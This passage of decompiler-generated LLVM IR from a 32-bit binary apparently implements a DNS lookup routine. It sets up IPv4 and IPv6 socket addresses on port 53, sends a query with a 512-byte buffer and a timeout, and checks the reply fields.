  %v2_8054a5e = inttoptr i32 %v1_8054a5e to i32*
  store i32 1025, i32* %v2_8054a5e, align 4
  %v1_8054a63 = add i32 %v0_8054a5b, 52
  %v2_8054a63 = inttoptr i32 %v1_8054a63 to i32*
  %v3_8054a63 = load i32, i32* %v2_8054a63, align 4
  store i32 %v3_8054a63, i32* %edx.global-to-local, align 4
  %v1_8054a67 = mul i32 %v3_8054a63, 4
  %v2_8054a67 = add i32 %v1_8054a67, 134627160
  %v3_8054a67 = inttoptr i32 %v2_8054a67 to i32*
  %v4_8054a67 = load i32, i32* %v3_8054a67, align 4
  %v6_8054a67 = add i32 %v0_8054a5b, 4
  %v7_8054a67 = inttoptr i32 %v6_8054a67 to i32*
  store i32 %v4_8054a67, i32* %v7_8054a67, align 4
  %v1_8054a6e = add i32 %v0_8054a5b, 28
  %v2_8054a6e = inttoptr i32 %v1_8054a6e to i32*
  %v3_8054a6e = load i32, i32* %v2_8054a6e, align 4
  %v6_8054a6e = inttoptr i32 %v0_8054a5b to i32*
  store i32 %v3_8054a6e, i32* %v6_8054a6e, align 4
  %v0_8054a72 = call i32 @function_8055b34()
  store i32 %v0_8054a72, i32* %eax.global-to-local, align 4
  %v0_8054a77 = load i32, i32* @esp, align 4
  %v1_8054a77 = add i32 %v0_8054a77, 16
  br label %dec_label_pc_8054a7a

dec_label_pc_8054a7a:                             ; preds = %dec_label_pc_80549e3.dec_label_pc_8054a7a_crit_edge, %dec_label_pc_8054a3b, %dec_label_pc_8054a47
  %v1_8054a7a = phi i32 [ %v1_8054a31, %dec_label_pc_80549e3.dec_label_pc_8054a7a_crit_edge ], [ %v1_8054a31, %dec_label_pc_8054a3b ], [ %v1_8054a77, %dec_label_pc_8054a47 ]
  %v0_8054a7a = phi i32 [ %v0_8054a7a.pre, %dec_label_pc_80549e3.dec_label_pc_8054a7a_crit_edge ], [ %v3_8054a34, %dec_label_pc_8054a3b ], [ %v0_8054a72, %dec_label_pc_8054a47 ]
  %v2_8054a7a = add i32 %v1_8054a7a, -4
  %v3_8054a7a = inttoptr i32 %v2_8054a7a to i32*
  store i32 %v0_8054a7a, i32* %v3_8054a7a, align 4
  %v0_8054a7b = load i32, i32* %eax.global-to-local, align 4
  %v2_8054a7b = add i32 %v1_8054a7a, -8
  %v3_8054a7b = inttoptr i32 %v2_8054a7b to i32*
  store i32 %v0_8054a7b, i32* %v3_8054a7b, align 4
  %v1_8054a7c = add i32 %v1_8054a7a, -12
  %v2_8054a7c = inttoptr i32 %v1_8054a7c to i32*
  store i32 1, i32* %v2_8054a7c, align 4
  %v1_8054a7e = add i32 %v1_8054a7a, 184
  store i32 %v1_8054a7e, i32* @eax, align 4
  %v2_8054a85 = add i32 %v1_8054a7a, -16
  %v3_8054a85 = inttoptr i32 %v2_8054a85 to i32*
  store i32 %v1_8054a7e, i32* %v3_8054a85, align 4
  %v2_8054a86 = call i32 @function_80535d2(i32 -1, i32 %v15_8054930)
  store i32 %v2_8054a86, i32* %eax.global-to-local, align 4
  %v0_8054a8b = load i32, i32* @esp, align 4
  %v1_8054a8b = add i32 %v0_8054a8b, 28
  %v2_8054a8b = inttoptr i32 %v1_8054a8b to i32*
  %v3_8054a8b = load i32, i32* %v2_8054a8b, align 4
  store i32 %v3_8054a8b, i32* %eax.global-to-local, align 4
  %v1_8054a8f = add i32 %v0_8054a8b, 260
  %v2_8054a8f = inttoptr i32 %v1_8054a8f to i32*
  %v3_8054a8f = load i32, i32* %v2_8054a8f, align 4
  store i32 %v3_8054a8f, i32* @edx, align 4
  %v2_8054a96 = add i32 %v0_8054a8b, 216
  %v3_8054a96 = inttoptr i32 %v2_8054a96 to i32*
  store i32 %v3_8054a8b, i32* %v3_8054a96, align 4
  %v0_8054a9d = load i32, i32* @edx, align 4
  %v1_8054a9d = load i32, i32* @esp, align 4
  %v2_8054a9d = add i32 %v1_8054a9d, 220
  %v3_8054a9d = inttoptr i32 %v2_8054a9d to i32*
  store i32 %v0_8054a9d, i32* %v3_8054a9d, align 4
  %v0_8054aa4 = load i32, i32* @esp, align 4
  %v1_8054aa4 = add i32 %v0_8054aa4, 224
  %v2_8054aa4 = inttoptr i32 %v1_8054aa4 to i32*
  store i32 1, i32* %v2_8054aa4, align 4
  %v0_8054ab4 = load i32, i32* @esp, align 4
  %v1_8054ab7 = load i32, i32* @ebx, align 4
  %v2_8054ab7 = sub i32 512, %v1_8054ab7
  %v2_8054ab9 = add i32 %v0_8054ab4, 8
  %v3_8054ab9 = inttoptr i32 %v2_8054ab9 to i32*
  store i32 %v2_8054ab7, i32* %v3_8054ab9, align 4
  %v1_8054aba = load i32, i32* @ebx, align 4
  %v2_8054aba = add i32 %v1_8054aba, %v1_80548a2
  %v2_8054abe = add i32 %v0_8054ab4, 4
  %v3_8054abe = inttoptr i32 %v2_8054abe to i32*
  store i32 %v2_8054aba, i32* %v3_8054abe, align 4
  %v1_8054abf = add i32 %v0_8054ab4, 216
  store i32 %v1_8054abf, i32* @eax, align 4
  %v3_8054ac6 = inttoptr i32 %v0_8054ab4 to i32*
  store i32 %v1_8054abf, i32* %v3_8054ac6, align 4
  %v0_8054ac7 = call i32 @function_80562bc()
  store i32 %v0_8054ac7, i32* %eax.global-to-local, align 4
  %v0_8054acc = load i32, i32* @esp, align 4
  store i32 %v0_8054ac7, i32* @esi, align 4
  %v2_8054ad1 = icmp slt i32 %v0_8054ac7, 0
  br i1 %v2_8054ad1, label %dec_label_pc_8054f35, label %dec_label_pc_8054ad9

dec_label_pc_8054ad9:                             ; preds = %dec_label_pc_8054a7a
  %v1_8054ad9 = add i32 %v0_8054acc, 172
  %v2_8054ad9 = inttoptr i32 %v1_8054ad9 to i16*
  store i16 2, i16* %v2_8054ad9, align 2
  %v1_8054ae3 = load i32, i32* @esp, align 4
  %v2_8054ae3 = add i32 %v1_8054ae3, -4
  %v3_8054ae3 = inttoptr i32 %v2_8054ae3 to i32*
  store i32 %v0_8054ac7, i32* %v3_8054ae3, align 4
  %v1_8054ae4 = add i32 %v1_8054ae3, 164
  store i32 %v1_8054ae4, i32* %eax.global-to-local, align 4
  %v2_8054aeb = add i32 %v1_8054ae3, -8
  %v3_8054aeb = inttoptr i32 %v2_8054aeb to i32*
  store i32 %v1_8054ae4, i32* %v3_8054aeb, align 4
  %v1_8054aec = add i32 %v1_8054ae3, 32
  %v2_8054aec = inttoptr i32 %v1_8054aec to i32*
  %v3_8054aec = load i32, i32* %v2_8054aec, align 4
  %v5_8054aec = add i32 %v1_8054ae3, -12
  %v6_8054aec = inttoptr i32 %v5_8054aec to i32*
  store i32 %v3_8054aec, i32* %v6_8054aec, align 4
  %v1_8054af0 = add i32 %v1_8054ae3, -16
  %v2_8054af0 = inttoptr i32 %v1_8054af0 to i32*
  store i32 10, i32* %v2_8054af0, align 4
  %v6_8054af2 = call i32 @function_8055cba(i32 -1, i8* %v5_8054af2, i32 %v3_805498f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8054af2, i32* %eax.global-to-local, align 4
  %v0_8054af7 = load i32, i32* @esp, align 4
  %v1_8054af7 = add i32 %v0_8054af7, 16
  %tmp46 = icmp slt i32 %v6_8054af2, 1
  br i1 %tmp46, label %dec_label_pc_8054b08, label %dec_label_pc_8054afe

dec_label_pc_8054afe:                             ; preds = %dec_label_pc_8054ad9
  %v1_8054afe = add i32 %v0_8054af7, 172
  %v2_8054afe = inttoptr i32 %v1_8054afe to i16*
  store i16 10, i16* %v2_8054afe, align 2
  %v0_8054b08.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054b08

dec_label_pc_8054b08:                             ; preds = %dec_label_pc_8054ad9, %dec_label_pc_8054afe
  %v0_8054b1f = phi i32 [ %v1_8054af7, %dec_label_pc_8054ad9 ], [ %v0_8054b08.pre, %dec_label_pc_8054afe ]
  %v1_8054b08 = add i32 %v0_8054b1f, 156
  %v2_8054b08 = inttoptr i32 %v1_8054b08 to i16*
  %v3_8054b08 = load i16, i16* %v2_8054b08, align 2
  %v12_8054b08 = icmp eq i16 %v3_8054b08, 10
  %v1_8054b11 = icmp eq i1 %v12_8054b08, false
  %v1_8054b1f = add i32 %v0_8054b1f, 158
  %v2_8054b1f = inttoptr i32 %v1_8054b1f to i16*
  store i16 13568, i16* %v2_8054b1f, align 2
  %v0_8054b29 = load i32, i32* @esp, align 4
  br i1 %v1_8054b11, label %dec_label_pc_8054b1f, label %dec_label_pc_8054b3f

dec_label_pc_8054b1f:                             ; preds = %dec_label_pc_8054b08
  %v1_8054b2c = add i32 %v0_8054b29, 32
  %v2_8054b2c = inttoptr i32 %v1_8054b2c to i32*
  %v3_8054b2c = load i32, i32* %v2_8054b2c, align 4
  %v5_8054b2c = add i32 %v0_8054b29, -16
  %v6_8054b2c = inttoptr i32 %v5_8054b2c to i32*
  store i32 %v3_8054b2c, i32* %v6_8054b2c, align 4
  %v1_8054b30 = call i32 @function_80518b4(i32 -1)
  store i32 %v1_8054b30, i32* %eax.global-to-local, align 4
  %v1_8054b35 = load i32, i32* @esp, align 4
  %v2_8054b35 = add i32 %v1_8054b35, 176
  %v3_8054b35 = inttoptr i32 %v2_8054b35 to i32*
  store i32 %v1_8054b30, i32* %v3_8054b35, align 4
  %v0_8054b3c = load i32, i32* @esp, align 4
  %v1_8054b3c = add i32 %v0_8054b3c, 16
  br label %dec_label_pc_8054b3f

dec_label_pc_8054b3f:                             ; preds = %dec_label_pc_8054b08, %dec_label_pc_8054b1f
  %v1_8054b3f = phi i32 [ %v1_8054b3c, %dec_label_pc_8054b1f ], [ %v0_8054b29, %dec_label_pc_8054b08 ]
  %v0_8054b3f = load i32, i32* @ecx, align 4
  %v2_8054b3f = add i32 %v1_8054b3f, -4
  %v3_8054b3f = inttoptr i32 %v2_8054b3f to i32*
  store i32 %v0_8054b3f, i32* %v3_8054b3f, align 4
  %v1_8054b40 = add i32 %v1_8054b3f, -8
  %v2_8054b40 = inttoptr i32 %v1_8054b40 to i32*
  store i32 17, i32* %v2_8054b40, align 4
  %v1_8054b42 = add i32 %v1_8054b3f, -12
  %v2_8054b42 = inttoptr i32 %v1_8054b42 to i32*
  store i32 2, i32* %v2_8054b42, align 4
  %v1_8054b44 = add i32 %v1_8054b3f, 156
  %v2_8054b44 = inttoptr i32 %v1_8054b44 to i16*
  %v3_8054b44 = load i16, i16* %v2_8054b44, align 2
  %v4_8054b44 = zext i16 %v3_8054b44 to i32
  store i32 %v4_8054b44, i32* %eax.global-to-local, align 4
  %v2_8054b4c = add i32 %v1_8054b3f, -16
  %v3_8054b4c = inttoptr i32 %v2_8054b4c to i32*
  store i32 %v4_8054b44, i32* %v3_8054b4c, align 4
  %v4_8054b4d = call i32 @function_8051dbc(i32 -1, i32 %v15_8054930, i32 %v3_805498f)
  store i32 %v4_8054b4d, i32* %eax.global-to-local, align 4
  %v1_8054b52 = load i32, i32* @esp, align 4
  %v2_8054b52 = add i32 %v1_8054b52, 36
  %v3_8054b52 = inttoptr i32 %v2_8054b52 to i32*
  store i32 %v4_8054b4d, i32* %v3_8054b52, align 4
  %v0_8054b56 = load i32, i32* @esp, align 4
  %v1_8054b56 = add i32 %v0_8054b56, 16
  %v0_8054b59 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054b59 = icmp slt i32 %v0_8054b59, 0
  br i1 %v2_8054b59, label %dec_label_pc_8054b86, label %dec_label_pc_8054b5d

dec_label_pc_8054b5d:                             ; preds = %dec_label_pc_8054b3f
  %v1_8054b5d = add i32 %v0_8054b56, 172
  store i32 %v1_8054b5d, i32* %eax.global-to-local, align 4
  %v0_8054b64 = load i32, i32* @edx, align 4
  %v2_8054b64 = add i32 %v0_8054b56, 12
  %v3_8054b64 = inttoptr i32 %v2_8054b64 to i32*
  store i32 %v0_8054b64, i32* %v3_8054b64, align 4
  %v1_8054b65 = add i32 %v0_8054b56, 8
  %v2_8054b65 = inttoptr i32 %v1_8054b65 to i32*
  store i32 28, i32* %v2_8054b65, align 4
  %v0_8054b67 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054b67 = add i32 %v0_8054b56, 4
  %v3_8054b67 = inttoptr i32 %v2_8054b67 to i32*
  store i32 %v0_8054b67, i32* %v3_8054b67, align 4
  %v1_8054b68 = add i32 %v0_8054b56, 36
  %v2_8054b68 = inttoptr i32 %v1_8054b68 to i32*
  %v3_8054b68 = load i32, i32* %v2_8054b68, align 4
  %v6_8054b68 = inttoptr i32 %v0_8054b56 to i32*
  store i32 %v3_8054b68, i32* %v6_8054b68, align 4
  %v4_8054b6c = call i32 @function_8051c40(i32 -1, i32 %v15_8054930, i32 %v3_805498f)
  store i32 %v4_8054b6c, i32* %eax.global-to-local, align 4
  %v0_8054b71 = load i32, i32* @esp, align 4
  %v2_8054b74 = icmp slt i32 %v4_8054b6c, 0
  %v1_8054b76 = icmp eq i1 %v2_8054b74, false
  br i1 %v1_8054b76, label %dec_label_pc_8054b8f, label %dec_label_pc_8054b78

dec_label_pc_8054b78:                             ; preds = %dec_label_pc_8054b5d
  %v1_8054b78 = call i32 @function_8050568(i32 -1)
  store i32 %v1_8054b78, i32* %eax.global-to-local, align 4
  %v1_8054b7d = inttoptr i32 %v1_8054b78 to i32*
  %v2_8054b7d = load i32, i32* %v1_8054b7d, align 4
  %v11_8054b7d = icmp eq i32 %v2_8054b7d, 101
  %v0_8054eef.pre = load i32, i32* @esp, align 4
  br i1 %v11_8054b7d, label %dec_label_pc_8054eef, label %dec_label_pc_8054b86

dec_label_pc_8054b86:                             ; preds = %dec_label_pc_8054b78, %dec_label_pc_8054b3f
  %v17_8054b86 = phi i32 [ %v1_8054b56, %dec_label_pc_8054b3f ], [ %v0_8054eef.pre, %dec_label_pc_8054b78 ]
  %v1_8054b86 = add i32 %v17_8054b86, 28
  %v2_8054b86 = inttoptr i32 %v1_8054b86 to i32*
  %v3_8054b86 = load i32, i32* %v2_8054b86, align 4
  %v4_8054b86 = add i32 %v3_8054b86, 1
  store i32 %v4_8054b86, i32* %v2_8054b86, align 4
  br label %dec_label_pc_8054f10.backedge

dec_label_pc_8054b8f:                             ; preds = %dec_label_pc_8054b5d
  %v0_8054b8f = load i32, i32* @ebx, align 4
  %v1_8054b8f = load i32, i32* @esi, align 4
  %v2_8054b8f = add i32 %v1_8054b8f, %v0_8054b8f
  store i32 %v2_8054b8f, i32* %eax.global-to-local, align 4
  %v1_8054b92 = add i32 %v0_8054b71, 12
  %v2_8054b92 = inttoptr i32 %v1_8054b92 to i32*
  store i32 0, i32* %v2_8054b92, align 4
  %v0_8054b94 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054b94 = add i32 %v0_8054b71, 8
  %v3_8054b94 = inttoptr i32 %v2_8054b94 to i32*
  store i32 %v0_8054b94, i32* %v3_8054b94, align 4
  %v2_8054b95 = add i32 %v0_8054b71, 4
  %v3_8054b95 = inttoptr i32 %v2_8054b95 to i32*
  store i32 %v1_80548a2, i32* %v3_8054b95, align 4
  %v1_8054b96 = add i32 %v0_8054b71, 36
  %v2_8054b96 = inttoptr i32 %v1_8054b96 to i32*
  %v3_8054b96 = load i32, i32* %v2_8054b96, align 4
  %v6_8054b96 = inttoptr i32 %v0_8054b71 to i32*
  store i32 %v3_8054b96, i32* %v6_8054b96, align 4
  %v5_8054b9a = call i32 @function_8051d08(i32 -1, i32 %v15_8054930, i32 %v3_805498f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8054b9a, i32* %eax.global-to-local, align 4
  %v0_8054b9f = load i32, i32* @esp, align 4
  %v1_8054b9f = add i32 %v0_8054b9f, 36
  %v2_8054b9f = inttoptr i32 %v1_8054b9f to i32*
  %v3_8054b9f = load i32, i32* %v2_8054b9f, align 4
  %v2_8054ba3 = add i32 %v0_8054b9f, 228
  %v3_8054ba3 = inttoptr i32 %v2_8054ba3 to i32*
  store i32 %v3_8054b9f, i32* %v3_8054ba3, align 4
  %v0_8054baa = load i32, i32* @esp, align 4
  %v1_8054baa = add i32 %v0_8054baa, 232
  %v2_8054baa = inttoptr i32 %v1_8054baa to i16*
  store i16 1, i16* %v2_8054baa, align 2
  %v0_8054bb4 = load i32, i32* @esp, align 4
  %v1_8054bb7 = add i32 %v0_8054bb4, 8
  %v2_8054bb7 = inttoptr i32 %v1_8054bb7 to i32*
  store i32 10000, i32* %v2_8054bb7, align 4
  %v1_8054bbc = add i32 %v0_8054bb4, 4
  %v2_8054bbc = inttoptr i32 %v1_8054bbc to i32*
  store i32 1, i32* %v2_8054bbc, align 4
  %v1_8054bbe = add i32 %v0_8054bb4, 228
  store i32 %v1_8054bbe, i32* %eax.global-to-local, align 4
  %v3_8054bc5 = inttoptr i32 %v0_8054bb4 to i32*
  store i32 %v1_8054bbe, i32* %v3_8054bc5, align 4
  %v0_8054bc6 = call i32 @function_80552b4()
  store i32 %v0_8054bc6, i32* %eax.global-to-local, align 4
  %v0_8054bcb = load i32, i32* @esp, align 4
  %v1_8054bcb = add i32 %v0_8054bcb, 16
  %tmp47 = icmp slt i32 %v0_8054bc6, 1
  br i1 %tmp47, label %dec_label_pc_8054eef, label %dec_label_pc_8054bd6

dec_label_pc_8054bd6:                             ; preds = %dec_label_pc_8054b8f
  %v1_8054bd6 = add i32 %v0_8054bcb, 12
  %v2_8054bd6 = inttoptr i32 %v1_8054bd6 to i32*
  store i32 0, i32* %v2_8054bd6, align 4
  %v1_8054bd8 = add i32 %v0_8054bcb, 8
  %v2_8054bd8 = inttoptr i32 %v1_8054bd8 to i32*
  store i32 512, i32* %v2_8054bd8, align 4
  %v2_8054bdd = add i32 %v0_8054bcb, 4
  %v3_8054bdd = inttoptr i32 %v2_8054bdd to i32*
  store i32 %v1_80548a2, i32* %v3_8054bdd, align 4
  %v1_8054bde = add i32 %v0_8054bcb, 36
  %v2_8054bde = inttoptr i32 %v1_8054bde to i32*
  %v3_8054bde = load i32, i32* %v2_8054bde, align 4
  %v6_8054bde = inttoptr i32 %v0_8054bcb to i32*
  store i32 %v3_8054bde, i32* %v6_8054bde, align 4
  %v5_8054be2 = call i32 @function_8051cd4(i32 -1, i32 %v15_8054930, i32 %v3_805498f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8054be2, i32* @eax, align 4
  %v1_8054be7 = load i32, i32* @esp, align 4
  %v2_8054be7 = add i32 %v1_8054be7, 32
  %v3_8054be7 = inttoptr i32 %v2_8054be7 to i32*
  store i32 %v5_8054be2, i32* %v3_8054be7, align 4
  %v0_8054beb = load i32, i32* @esp, align 4
  %v1_8054beb = add i32 %v0_8054beb, 16
  %v7_8054bf1 = icmp sgt i32 %v5_8054be2, 11
  br i1 %v7_8054bf1, label %dec_label_pc_8054bf7, label %dec_label_pc_8054ea4

dec_label_pc_8054bf7:                             ; preds = %dec_label_pc_8054bd6
  %v0_8054bf7 = load i32, i32* @ebx, align 4
  %v2_8054bf7 = add i32 %v0_8054beb, 12
  %v3_8054bf7 = inttoptr i32 %v2_8054bf7 to i32*
  store i32 %v0_8054bf7, i32* %v3_8054bf7, align 4
  %v0_8054bf8 = load i32, i32* @ebx, align 4
  %v2_8054bf8 = add i32 %v0_8054beb, 8
  %v3_8054bf8 = inttoptr i32 %v2_8054bf8 to i32*
  store i32 %v0_8054bf8, i32* %v3_8054bf8, align 4
  %v1_8054bf9 = add i32 %v0_8054beb, 84
  store i32 %v1_8054bf9, i32* %eax.global-to-local, align 4
  %v2_8054bfd = add i32 %v0_8054beb, 4
  %v3_8054bfd = inttoptr i32 %v2_8054bfd to i32*
  store i32 %v1_8054bf9, i32* %v3_8054bfd, align 4
  %v3_8054bfe = inttoptr i32 %v0_8054beb to i32*
  store i32 %v1_80548a2, i32* %v3_8054bfe, align 4
  %v0_8054bff = call i32 @function_8056210()
  store i32 %v0_8054bff, i32* %eax.global-to-local, align 4
  %v0_8054c04 = load i32, i32* @esp, align 4
  %v1_8054c04 = add i32 %v0_8054c04, 84
  %v2_8054c04 = inttoptr i32 %v1_8054c04 to i32*
  %v3_8054c04 = load i32, i32* %v2_8054c04, align 4
  store i32 %v3_8054c04, i32* %edx.global-to-local, align 4
  %v2_8054c08 = add i32 %v0_8054c04, 72
  %v3_8054c08 = inttoptr i32 %v2_8054c08 to i32*
  store i32 %v3_8054c04, i32* %v3_8054c08, align 4
  %v0_8054c0c = load i32, i32* @esp, align 4
  %v1_8054c0c = add i32 %v0_8054c0c, 16
  %v1_8054c0f = add i32 %v0_8054c0c, 60
  %v2_8054c0f = inttoptr i32 %v1_8054c0f to i32*
  %v3_8054c0f = load i32, i32* %v2_8054c0f, align 4
  store i32 %v3_8054c0f, i32* @eax, align 4
  %v0_8054c13 = load i32, i32* %edx.global-to-local, align 4
  %v12_8054c13 = icmp eq i32 %v0_8054c13, %v3_8054c0f
  %v1_8054c15 = icmp eq i1 %v12_8054c13, false
  br i1 %v1_8054c15, label %dec_label_pc_8054ea4, label %dec_label_pc_8054c1b

dec_label_pc_8054c1b:                             ; preds = %dec_label_pc_8054bf7
  %v1_8054c1b = add i32 %v0_8054c0c, 88
  %v2_8054c1b = inttoptr i32 %v1_8054c1b to i32*
  %v3_8054c1b = load i32, i32* %v2_8054c1b, align 4
  %v4_8054c1b = icmp eq i32 %v3_8054c1b, 0
  br i1 %v4_8054c1b, label %dec_label_pc_8054ea4, label %dec_label_pc_8054c26

dec_label_pc_8054c26:                             ; preds = %dec_label_pc_8054c1b
  %v1_8054c26 = add i32 %v0_8054c0c, 112
  %v2_8054c26 = inttoptr i32 %v1_8054c26 to i32*
  %v3_8054c26 = load i32, i32* %v2_8054c26, align 4
  store i32 %v3_8054c26, i32* @eax, align 4
  %v9_8054c2a = icmp eq i32 %v3_8054c26, 3
  %v1_8054c2d = icmp eq i1 %v9_8054c2a, false
  br i1 %v1_8054c2d, label %dec_label_pc_8054c95, label %dec_label_pc_8054c2f

dec_label_pc_8054c2f:                             ; preds = %dec_label_pc_8054c26
  %v1_8054c2f = add i32 %v0_8054c0c, 67
  %v2_8054c2f = inttoptr i32 %v1_8054c2f to i8*
  %v3_8054c2f = load i8, i8* %v2_8054c2f, align 1
  %v4_8054c2f = icmp eq i8 %v3_8054c2f, 0
  %v1_8054c34 = icmp eq i1 %v4_8054c2f, false
  br i1 %v1_8054c34, label %dec_label_pc_8054c85, label %dec_label_pc_8054c36

dec_label_pc_8054c36:                             ; preds = %dec_label_pc_8054c2f
  %v0_8054c36 = load i32, i32* @ecx, align 4
  %v2_8054c36 = add i32 %v0_8054c0c, 12
  %v3_8054c36 = inttoptr i32 %v2_8054c36 to i32*
  store i32 %v0_8054c36, i32* %v3_8054c36, align 4
  %v1_8054c37 = add i32 %v0_8054c0c, 8
  %v2_8054c37 = inttoptr i32 %v1_8054c37 to i32*
  store i32 ptrtoint (i32* @global_var_805d888.337 to i32), i32* %v2_8054c37, align 4
  %v1_8054c3c = add i32 %v0_8054c0c, 4
  %v2_8054c3c = inttoptr i32 %v1_8054c3c to i32*
  store i32 134559183, i32* %v2_8054c3c, align 4
  %v1_8054c41 = add i32 %v0_8054c0c, 200
  store i32 %v1_8054c41, i32* @esi, align 4
  %v3_8054c48 = inttoptr i32 %v0_8054c0c to i32*
  store i32 %v1_8054c41, i32* %v3_8054c48, align 4
  %v2_8054c49 = call i32 @function_80535d2(i32 -1, i32 %v15_8054930)
  store i32 %v2_8054c49, i32* %eax.global-to-local, align 4
  %v0_8054c4e = load i32, i32* @esp, align 4
  %v1_8054c4e = inttoptr i32 %v0_8054c4e to i32*
  store i32 ptrtoint (i32* @global_var_805d888.337 to i32), i32* %v1_8054c4e, align 4
  %v1_8054c55 = call i32 @function_80535cf(i32 -1)
  store i32 %v1_8054c55, i32* %eax.global-to-local, align 4
  %v0_8054c5a = load i32, i32* @esp, align 4
  %v1_8054c5a = inttoptr i32 %v0_8054c5a to i32*
  %v2_8054c5a = load i32, i32* %v1_8054c5a, align 4
  store i32 %v2_8054c5a, i32* @eax, align 4
  %v3_8054c5a = add i32 %v0_8054c5a, 4
  %v1_8054c5b = inttoptr i32 %v3_8054c5a to i32*
  %v2_8054c5b = load i32, i32* %v1_8054c5b, align 4
  store i32 %v2_8054c5b, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8054c5b, align 4
  %v0_8054c5e = load i32, i32* @esi, align 4
  store i32 %v0_8054c5e, i32* %v1_8054c5a, align 4
  %v0_8054c5f = load i32, i32* @global_var_8063f78.398, align 8
  store i32 %v0_8054c5f, i32* %ebx.global-to-local, align 4
  %v2_8054c65 = call i32 @function_80535d2(i32 -1, i32 %v15_8054930)
  store i32 %v2_8054c65, i32* %eax.global-to-local, align 4
  %v0_8054c6a = load i32, i32* @esp, align 4
  %v1_8054c6d = add i32 %v0_8054c5f, -1
  store i32 %v1_8054c6d, i32* @ebx, align 4
  %v1_8054c6e = add i32 %v0_8054c6a, 52
  %v2_8054c6e = inttoptr i32 %v1_8054c6e to i32*
  %v3_8054c6e = load i32, i32* %v2_8054c6e, align 4
  %v5_8054c6e = sub i32 %v3_8054c6e, %v1_8054c6d
  %v11_8054c6e = xor i32 %v3_8054c6e, %v1_8054c6d
  %v12_8054c6e = xor i32 %v5_8054c6e, %v3_8054c6e
  %v13_8054c6e = and i32 %v12_8054c6e, %v11_8054c6e
  %v14_8054c6e = icmp slt i32 %v13_8054c6e, 0
  %v16_8054c6e = icmp slt i32 %v5_8054c6e, 0
  %v2_8054c72 = icmp eq i1 %v16_8054c6e, %v14_8054c6e
  br i1 %v2_8054c72, label %dec_label_pc_8054c85, label %dec_label_pc_8054c74

dec_label_pc_8054c74:                             ; preds = %dec_label_pc_8054c36
  %v4_8054c74 = add i32 %v3_8054c6e, 1
  store i32 %v4_8054c74, i32* %v2_8054c6e, align 4
  %v0_8054c78 = load i32, i32* @esp, align 4
  %v1_8054c78 = add i32 %v0_8054c78, 56
  %v2_8054c78 = inttoptr i32 %v1_8054c78 to i32*
  %v3_8054c78 = load i32, i32* %v2_8054c78, align 4
  store i32 %v3_8054c78, i32* %edx.global-to-local, align 4
  %v2_8054c7c = add i32 %v0_8054c78, 44
  %v3_8054c7c = inttoptr i32 %v2_8054c7c to i32*
  store i32 %v3_8054c78, i32* %v3_8054c7c, align 4
  br label %dec_label_pc_8054f10.backedge

dec_label_pc_8054c85:                             ; preds = %dec_label_pc_8054c36, %dec_label_pc_8054c2f
  %v0_8054c85 = call i32 @function_8053b78()
  store i32 %v0_8054c85, i32* %eax.global-to-local, align 4
  %v1_8054c8a = inttoptr i32 %v0_8054c85 to i32*
  store i32 1, i32* %v1_8054c8a, align 4
  br label %dec_label_pc_8054f48

dec_label_pc_8054c95:                             ; preds = %dec_label_pc_8054c26
  %v1_8054c95 = icmp eq i32 %v3_8054c26, 0
  %v1_8054c97 = icmp eq i1 %v1_8054c95, false
  br i1 %v1_8054c97, label %dec_label_pc_8054ea4, label %dec_label_pc_8054c9d

dec_label_pc_8054c9d:                             ; preds = %dec_label_pc_8054c95
  %v1_8054c9d = add i32 %v0_8054c0c, 120
  %v2_8054c9d = inttoptr i32 %v1_8054c9d to i32*
  %v3_8054c9d = load i32, i32* %v2_8054c9d, align 4
  %tmp48 = icmp slt i32 %v3_8054c9d, 1
  br i1 %tmp48, label %dec_label_pc_8054cad, label %dec_label_pc_8054ca4

dec_label_pc_8054ca4:                             ; preds = %dec_label_pc_8054c9d
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_8054ccc54 = add i32 %v0_8054c0c, 116
  %v3_8054ccc55 = inttoptr i32 %v2_8054ccc54 to i32*
  %v4_8054ccc56 = load i32, i32* %v3_8054ccc55, align 4
  %v5_8054ccc57 = sub i32 0, %v4_8054ccc56
  %v13_8054ccc60 = and i32 %v4_8054ccc56, %v5_8054ccc57
  %v14_8054ccc61 = icmp slt i32 %v13_8054ccc60, 0
  %v16_8054ccc63 = icmp slt i32 %v5_8054ccc57, 0
  %v2_8054cd064 = icmp eq i1 %v16_8054ccc63, %v14_8054ccc61
  br i1 %v2_8054cd064, label %dec_label_pc_8054cd2, label %dec_label_pc_8054cbd

dec_label_pc_8054cad:                             ; preds = %dec_label_pc_8054c9d
  %v0_8054cad = call i32 @function_8053b78()
  store i32 %v0_8054cad, i32* %eax.global-to-local, align 4
  %v1_8054cb2 = inttoptr i32 %v0_8054cad to i32*
  store i32 4, i32* %v1_8054cb2, align 4
  br label %dec_label_pc_8054f48

dec_label_pc_8054cbd:                             ; preds = %dec_label_pc_8054ca4, %dec_label_pc_8054cbd
  %v0_8054cd466 = phi i32 [ %v1_8054cc9, %dec_label_pc_8054cbd ], [ %v1_8054c0c, %dec_label_pc_8054ca4 ]
  %v0_8054cbd65 = phi i32 [ %v0_8054cc1, %dec_label_pc_8054cbd ], [ %v3_8054c26, %dec_label_pc_8054ca4 ]
  %v2_8054cbd = add i32 %v0_8054cd466, -4
  %v3_8054cbd = inttoptr i32 %v2_8054cbd to i32*
  store i32 %v0_8054cbd65, i32* %v3_8054cbd, align 4
  %v0_8054cbe = load i32, i32* @eax, align 4
  %v2_8054cbe = add i32 %v0_8054cd466, -8
  %v3_8054cbe = inttoptr i32 %v2_8054cbe to i32*
  store i32 %v0_8054cbe, i32* %v3_8054cbe, align 4
  %v0_8054cbf = load i32, i32* @esi, align 4
  %v2_8054cbf = add i32 %v0_8054cd466, -12
  %v3_8054cbf = inttoptr i32 %v2_8054cbf to i32*
  store i32 %v0_8054cbf, i32* %v3_8054cbf, align 4
  %v2_8054cc0 = add i32 %v0_8054cd466, -16
  %v3_8054cc0 = inttoptr i32 %v2_8054cc0 to i32*
  store i32 %v1_80548a2, i32* %v3_8054cc0, align 4
  %v0_8054cc1 = call i32 @function_8056310()
  store i32 %v0_8054cc1, i32* @eax, align 4
